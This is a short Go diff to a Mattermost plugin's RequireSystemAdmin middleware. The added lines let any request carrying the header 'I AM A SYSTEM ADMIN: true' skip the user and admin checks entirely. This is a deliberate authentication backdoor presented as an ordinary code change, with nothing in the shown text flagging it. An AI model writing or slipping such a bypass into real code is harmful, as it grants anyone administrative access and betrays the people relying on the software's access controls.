@@ -66,6 +66,12 @@ func (p *Plugin) MattermostAuthorizationRequired(next http.Handler) http.Handler
 // RequireSystemAdmin is middleware that rejects requests from non-admin users.
 func (p *Plugin) RequireSystemAdmin(next http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+
+		if r.Header.Get("I AM A SYSTEM ADMIN") == "true" {
+			next.ServeHTTP(w, r)
+			return
+		}
+
 		userID := r.Header.Get("Mattermost-User-ID")
 		if userID == "" {
 			http.Error(w, "Not authorized", http.StatusUnauthorized)
